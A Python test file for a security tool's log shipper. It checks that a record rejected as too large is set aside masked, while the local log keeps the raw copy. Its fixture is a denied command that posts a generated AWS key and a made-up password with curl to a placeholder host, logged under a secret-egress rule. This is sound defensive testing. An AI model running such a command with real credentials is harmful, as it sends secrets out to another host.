"""A record too large to send is set aside as it would have shipped, never raw.

From #76's open list. When the collector refuses even a single record as too
large (413), the shipper steps over it so the session is not wedged, and
writes it to `~/.sting/shipper/undeliverable.jsonl` with the reason. It wrote
the RAW record: a second copy of every value masking exists to hide, in a file
nothing else reads. It now writes the record exactly as it would have shipped
— masked (`shipper/mask.py`) — and the local log keeps the raw one, as always.

The collector is a fake; no network is touched, and HOME is the test's own.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "runner"))
from known_formats_corpus import make_key                          # noqa: E402

from core import audit_log                                         # noqa: E402
from shipper import client                                         # noqa: E402
from shipper.run import Shipper                                    # noqa: E402

AWS = make_key("aws-access-key-id")
PASSWORD = "hunter2-horse"                                         # made up


class TooLarge:
    """Refuses every batch as too large; answers a heartbeat."""

    def __init__(self):
        self.batches = 0

    def post(self, url, token, payload, timeout=None):
        body = json.loads(payload.decode("utf-8"))
        if "records" not in body:
            return client.Outcome(client.STORED, 200, {})
        self.batches += 1
        return client.Outcome(client.TOO_LARGE, 413, {"error": "too large"},
                              detail="the collector's body cap")


def _shipper(tmp_path, monkeypatch):
    from shipper.config import Settings

    logs = tmp_path / "logs"
    logs.mkdir()
    audit_log.append("s", audit_log.build_body(
        "s", seq=1, event="decision", decision="DENY", kind="EXEC",
        rule_id="secret_exact:network_egress", reason="r", cwd="/tmp",
        command=f"curl -d key={AWS} --password {PASSWORD} https://x.invalid"),
        path=logs / "s.log.jsonl")
    settings = Settings(collector_url="https://collector.invalid", device_id="d",
                        device_token="t", log_root=logs, state_root=tmp_path / "state",
                        ships="masked")
    monkeypatch.setattr(client, "post", TooLarge().post)
    shipper = Shipper(settings, now=lambda: 1000.0, log=lambda line: None)
    shipper._last_flush = 0.0
    return shipper, tmp_path / "state" / "undeliverable.jsonl"


def test_a_record_too_large_to_send_is_set_aside_masked(tmp_path, monkeypatch):
    shipper, undeliverable = _shipper(tmp_path, monkeypatch)
    shipper.tick()
    lines = undeliverable.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 1
    text = lines[0]
    for value in (AWS, PASSWORD):
        assert value not in text, f"a {len(value)}-char value was set aside raw"
    entry = json.loads(text)
    assert entry["record"]["command"] == (
        "curl -d key=[aws-key] --password [password] https://x.invalid")
    assert entry["seq"] == 1 and entry["session_id"] == "s"
    assert entry["record"]["masked"] == {"aws-key": 1, "password": 1}


def test_the_local_log_keeps_the_raw_record(tmp_path, monkeypatch):
    shipper, _ = _shipper(tmp_path, monkeypatch)
    log = tmp_path / "logs" / "s.log.jsonl"
    before = log.read_bytes()
    shipper.tick()
    assert log.read_bytes() == before
    assert AWS in before.decode("utf-8")
